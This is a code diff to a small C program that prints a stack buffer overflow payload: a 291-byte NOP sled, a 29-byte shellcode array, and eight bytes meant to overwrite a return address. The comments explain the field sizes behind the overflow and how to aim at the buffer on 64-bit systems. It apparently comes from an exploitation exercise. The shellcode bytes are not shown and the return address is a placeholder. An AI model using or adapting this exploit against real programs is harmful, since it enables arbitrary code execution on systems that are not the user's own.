@@ -11,5 +11,19 @@ const uint8_t sc[29] = {
 };
 
 int main(){
+  //username is 64 chars, text is 256. 320 chars and it reaches parseIncoming.
+  //However, after 4 or 8 more bytes (depending on the system), we will overwrite
+  //essential functions that will break out program and not send anything out.
+  //From now on, let's assume we're attacking 64-bit computers. So, we need our final
+  //8 bytes to point to our payload (sc).
+  
+  //The structure here consists of three parts.
+  //First, we will have a nop sled of length 291.
+  //Then, we have our payload. This completes the 320 bytes of the struct
+  //The last eight bytes will be for pointing back to the buffer. Finding
+  //this address is the hardest part, however the nop sled will give us
+  //a considerable amount of wiggle room.
+  for (int j = 0; j < 291; ++j) printf("%c", 0x90); //nop
   for (int i = 0; i < 29; ++i) printf("%c", sc[i]);
+  for (int k = 0; k < 8; ++k) printf("%c", 42);
 }
